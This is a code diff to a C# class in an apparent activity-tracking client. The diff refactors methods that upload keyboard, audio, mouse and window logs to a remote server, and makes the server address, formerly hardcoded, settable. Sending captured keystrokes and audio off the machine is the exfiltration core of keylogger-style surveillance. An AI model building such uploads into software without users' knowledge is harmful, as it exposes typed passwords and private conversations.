@@ -3,6 +3,7 @@ using System.IO;
 using System.Net;
 using System.Net.Http;
 using System.Net.Http.Headers;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using Flurl.Http;
@@ -12,13 +13,39 @@ namespace TrackzamClient
 {
     public class DataSender
     {
+        public static void SetIPAdress(string ipAddress)
+        {
+            _ipAddress = ipAddress;
+        }
+        public static void SendAudioLogs(string path)
+        {
+            SendFileAsync("send_audio_logs", path);
+        }
+        
+        public static void SendKeyboardLogs(string path)
+        {
+            SendFileAsync("send_keyboard_logs", path);
+        }
+        
+        public static void SendMouseLogs(string path)
+        {
+            SendFileAsync("send_mouse_logs", path);
+        }
+        
+        public static void SendWindowLogs(string path)
+        {
+            SendFileAsync("send_window_logs", path);
+        }
+        
         private static async void SendFileAsync(string type, string path)
         {
             await Task.Run(() =>
             {
-                HttpWebRequest requestToServerEndpoint =
-                (HttpWebRequest)WebRequest.Create("http://34.71.243.7:8000/api/" + type);
- 
+                HttpWebRequest requestToServerEndpoint = 
+                    (HttpWebRequest)WebRequest.Create(new StringBuilder().Append("http://")
+                        .Append(_ipAddress).Append(":8000/api/").Append(type).ToString());
+
+        
                 string boundaryString = "----SomeRandomText";
                 string fileUrl = path;
                 
@@ -68,24 +95,6 @@ namespace TrackzamClient
             });
         }
 
-        public static void SendAudioLogs(string path)
-        {
-            SendFileAsync("send_audio_logs", path);
-        }
-        
-        public static void SendKeyboardLogs(string path)
-        {
-            SendFileAsync("send_keyboard_logs", path);
-        }
-        
-        public static void SendMouseLogs(string path)
-        {
-            SendFileAsync("send_mouse_logs", path);
-        }
-        
-        public static void SendWindowLogs(string path)
-        {
-            SendFileAsync("send_window_logs", path);
-        }
+        private static string _ipAddress = "34.71.243.7";
     }
 }
